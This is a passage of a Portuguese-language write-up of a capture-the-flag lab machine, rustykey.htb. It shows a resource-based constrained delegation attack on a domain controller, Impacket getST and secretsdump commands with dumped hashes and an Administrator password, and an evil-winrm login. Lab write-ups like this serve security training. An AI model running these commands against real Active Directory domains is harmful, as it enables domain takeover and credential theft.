Analisando o nosso cenário atual, ja possuimos a conta de serviço `IT-Computer3$`, e existe um usuário chamado `BackupAdmin` no AD que possui a permissão de `DCSync`. Tendo isso em mente, podemos tentar um ataque de `RBCD` (Resource-based Constrained Delegation). Esse [hacktricks](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/resource-based-constrained-delegation#new-concepts) explica detalhadamente esse ataque, mas resumindo aqui: Iremos adicionar uma permissão chamada `msDS-AllowedToActOnBehalfOfOtherIdentity` no "computador" `DC` que permitirá a conta `IT-Computer3$` "fingir" ou "fazer" coisas no nome do `DC`, ou seja, iremos impersonar o `DC` e gerar um TGS no nome do `BackupAdmin` e rodar `DCSync`.

Para realizar esse ataque, irei utilizar os seguintes comandos na shell do **MM.TURNER**:
```bash
PS C:\Windows> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount 'it-computer3$'
PS C:\Windows> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb} <-- Permissão setada com sucesso
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    : 
```

{{< alert >}}
**Aqui colocamos a permissão no `DC` pois irá nos permitir impersonar qualquer usuário do AD.**
{{< /alert >}}

Após isso é só solicitar um TGS impersonando o `BackupAdmin` e rodar o `DCSync`. Para solicitar o TGS estarei usando o `getST.py` do `Impacket`:
```bash
getST.py -spn CIFS/dc.rustykey.htb -impersonate BackupAdmin -dc-ip "dc.rustykey.htb" "rustykey.htb"/'it-computer3$':'Rusty88!'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating BackupAdmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in BackupAdmin@CIFS_dc.rustykey.htb@RUSTYKEY.HTB.ccache
```

E para dumpar as hashs do dominio, estarei usando o `secretsDump.py` que também é do `Impacket`:
```bash
KRB5CCNAME=BackupAdmin@CIFS_dc.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump -k "dc.rustykey.htb"

[*] Service RemoteRegistry is in stopped state                                                                                                                                                
[*] Starting service RemoteRegistry                                                                                                                                                           
[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4                                                                                                                                 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::                                                                                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                       
[*] Dumping cached domain logon information (domain/username:hash)                                                                                                                            
[*] Dumping LSA Secrets                                                                                                                                                                       
[*] $MACHINE.ACC                                                                                                                                                                              
RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae4
8ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093
303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25                                                          
RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::                                                                                                             
[*] DefaultPassword                                                                                                                                                                           
RUSTYKEY\Administrator:Rustyrc4key#!                                            
...                                                                              
```

O `secretsDump` nos retornou a senha do **Administrator**, então não precisamos utilizar a hash. E para finalizar a máquina, só falta solicitar o TGT do **Administrator** e pegar a flag root:
```bash
>export KRB5CCNAME=Administrator.ccache                                
>evil-winrm -r RUSTYKEY.HTB -i dc.rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```